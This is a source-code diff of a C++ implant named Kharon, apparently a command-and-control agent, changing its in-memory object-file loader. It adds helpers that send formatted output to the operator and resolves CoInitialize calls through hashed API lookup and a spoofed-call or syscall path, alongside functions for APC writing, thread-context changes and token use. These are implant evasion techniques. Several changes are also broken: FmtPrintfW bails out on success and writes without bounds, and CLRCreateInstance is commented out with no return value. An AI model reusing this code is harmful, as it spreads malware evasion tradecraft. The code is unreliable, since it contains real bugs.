@@ -35,6 +35,49 @@ auto DECLFN Coff::Output(
     Self->Pkg->SendOut( type, CommandID, (BYTE*)data, len );
 }
 
+auto DECLFN Coff::PrintfW(
+    INT  type,
+    PWCH fmt,
+    ...
+) -> VOID {
+    G_KHARON
+
+    va_list VaList;
+
+    VOID*  MemRange = __builtin_return_address( 0 );
+    CHAR*  UUID     = nullptr;
+    int    MsgSize  = 0;
+    int    written  = 0;
+    WCHAR* MsgBuff  = nullptr;
+
+    va_start( VaList, fmt );
+    MsgSize = Self->Msvcrt.k_vswprintf( nullptr, fmt, VaList );
+    va_end( VaList );
+    if ( MsgSize < 0 ) {
+        KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
+    }
+
+    MsgBuff = ( WCHAR* )hAlloc( MsgSize + 1 );
+    if ( !MsgBuff ) {
+        KhDbg( "Printf: allocation failed" ); goto _KH_END;
+    }
+
+    va_start( VaList, fmt );
+    written = Self->Msvcrt.k_vswprintf( MsgBuff, fmt, VaList );
+    va_end( VaList );
+    if ( written < 0 ) {
+        KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
+    }
+    MsgBuff[written] = '\0'; 
+
+    UUID = Self->Cf->GetTask( MemRange );
+    KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
+    Self->Pkg->SendMsgW( type, MsgBuff );
+
+_KH_END:
+    if ( MsgBuff ) hFree( MsgBuff );
+}
+
 auto DECLFN Coff::Printf(
     INT  type,
     PCCH fmt,
@@ -72,7 +115,7 @@ auto DECLFN Coff::Printf(
 
     UUID = Self->Cf->GetTask( MemRange );
     KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
-    Self->Pkg->SendMsg( type, MsgBuff );
+    Self->Pkg->SendMsgA( type, MsgBuff );
 
 _KH_END:
     if ( MsgBuff ) hFree( MsgBuff );
@@ -138,6 +181,29 @@ auto DECLFN Coff::FmtAppend(
     Fmt->length += Len;
 }
 
+auto DECLFN Coff::FmtPrintfW(
+    FMTP*  Fmt,
+    WCHAR* Data,
+    ...
+) -> VOID {
+    G_KHARON
+
+    va_list Args;
+    va_start( Args, Data );
+
+    size_t avail   = Fmt->size - Fmt->length - 1;
+    int    written = Self->Msvcrt.k_vswprintf( (WCHAR*)Fmt->buffer, Data, Args );
+
+    va_end( Args );
+    if ( written ) {
+        KhDbg( "FmtPrintf: vswnprint error" );
+        return;
+    }
+
+    Fmt->buffer += written;
+    Fmt->length += written;
+}
+
 auto DECLFN Coff::FmtPrintf(
     FMTP* Fmt,
     CHAR* Data,
@@ -146,9 +212,8 @@ auto DECLFN Coff::FmtPrintf(
     G_KHARON
 
     va_list Args;
-    va_start( Args, Data);
+    va_start( Args, Data );
 
-    // NUL space in FmtToString
     size_t avail = Fmt->size - Fmt->length - 1;
     int written = Self->Msvcrt.vsnprintf( Fmt->buffer, avail, Data, Args );
 
@@ -192,14 +257,14 @@ auto DECLFN Coff::FmtToString(
 
     if ( (UINT32)fmt->length >= fmt->size ) {
         UINT32 newSize = max( (UINT32)fmt->length + 1, fmt->size * 2 );
-        CHAR* newbuf = ( CHAR* )hAlloc( newSize );
-        if ( !newbuf ) {
+        CHAR*  Newbuf  = ( CHAR* )hAlloc( newSize );
+        if ( !Newbuf ) {
             if ( size ) *size = 0;
             return nullptr;
         }
-        Mem::Copy( newbuf, fmt->original, fmt->length );
+        Mem::Copy( Newbuf, fmt->original, fmt->length );
         hFree( fmt->original );
-        fmt->original = newbuf;
+        fmt->original = Newbuf;
         fmt->size     = newSize;
     }
 
@@ -390,47 +455,47 @@ auto DECLFN Coff::WriteApc(
 auto DECLFN Coff::CLRCreateInstance(
     REFCLSID clsid, REFIID riid, LPVOID* ppInterface
 ) -> HRESULT {
-    G_KHARON
+    // G_KHARON
 
-    if (!ppInterface) {
-        return E_POINTER;
-    }
+    // if (!ppInterface) {
+    //     return E_POINTER;
+    // }
 
-    if ( Self->Config.Syscall ) {
-        struct GUID_PACK {
-            UPTR part1;
-            UPTR part2;
-        };
+    // if ( Self->Config.Syscall ) {
+    //     struct GUID_PACK {
+    //         UPTR part1;
+    //         UPTR part2;
+    //     };
         
-        GUID_PACK clsid_pack = {
-            *reinterpret_cast<const UPTR*>(&clsid.Data1),
-            *reinterpret_cast<const UPTR*>(&clsid.Data2)
-        };
+    //     GUID_PACK clsid_pack = {
+    //         *reinterpret_cast<const UPTR*>(&clsid.Data1),
+    //         *reinterpret_cast<const UPTR*>(&clsid.Data2)
+    //     };
         
-        GUID_PACK riid_pack = {
-            *reinterpret_cast<const UPTR*>(&riid.Data1),
-            *reinterpret_cast<const UPTR*>(&riid.Data2)
-        };
+    //     GUID_PACK riid_pack = {
+    //         *reinterpret_cast<const UPTR*>(&riid.Data1),
+    //         *reinterpret_cast<const UPTR*>(&riid.Data2)
+    //     };
 
-        return static_cast<HRESULT>(Self->Spf->Call(
-            reinterpret_cast<UPTR>(Self->Mscoree.CLRCreateInstance),
-            clsid_pack.part1,
-            clsid_pack.part2,
-            reinterpret_cast<UPTR>(&clsid.Data3),
-            reinterpret_cast<UPTR>(clsid.Data4),
-            riid_pack.part1,
-            riid_pack.part2,
-            reinterpret_cast<UPTR>(&riid.Data3),
-            reinterpret_cast<UPTR>(riid.Data4),
-            reinterpret_cast<UPTR>(ppInterface)
-        ));
-    } else {
-        return Self->Mscoree.CLRCreateInstance(
-            clsid,
-            riid,
-            ppInterface
-        );
-    }
+    //     return static_cast<HRESULT>(Self->Spf->Call(
+    //         reinterpret_cast<UPTR>(Self->Mscoree.CLRCreateInstance),
+    //         clsid_pack.part1,
+    //         clsid_pack.part2,
+    //         reinterpret_cast<UPTR>(&clsid.Data3),
+    //         reinterpret_cast<UPTR>(clsid.Data4),
+    //         riid_pack.part1,
+    //         riid_pack.part2,
+    //         reinterpret_cast<UPTR>(&riid.Data3),
+    //         reinterpret_cast<UPTR>(riid.Data4),
+    //         reinterpret_cast<UPTR>(ppInterface)
+    //     ));
+    // } else {
+    //     return Self->Mscoree.CLRCreateInstance(
+    //         clsid,
+    //         riid,
+    //         ppInterface
+    //     );
+    // }
 }
 
 auto DECLFN Coff::SetThreadContext(
@@ -453,7 +518,14 @@ auto DECLFN Coff::CoInitialize(
     LPVOID pvReserved
 ) -> HRESULT {
     G_KHARON
-    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitialize, 0, (UPTR)pvReserved );
+
+    HRESULT(*khCoInitialize)(PVOID) = (decltype(khCoInitialize))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitialize") );
+
+    if ( Self->Config.Syscall ) {
+        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitialize, 0, (UPTR)pvReserved );
+    }
+
+    return khCoInitialize( pvReserved );
 }
 
 auto DECLFN Coff::CoInitializeEx(
@@ -461,7 +533,14 @@ auto DECLFN Coff::CoInitializeEx(
     DWORD  dwCoInit
 ) -> HRESULT {
     G_KHARON
-    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
+
+    HRESULT(*khCoInitializeEx)(PVOID, DWORD) = (decltype(khCoInitializeEx))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitializeEx") );
+
+    if ( Self->Config.Syscall ) {
+        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
+    }
+
+    return khCoInitializeEx( pvReserved, dwCoInit );
 }
 
 auto Coff::UseToken(
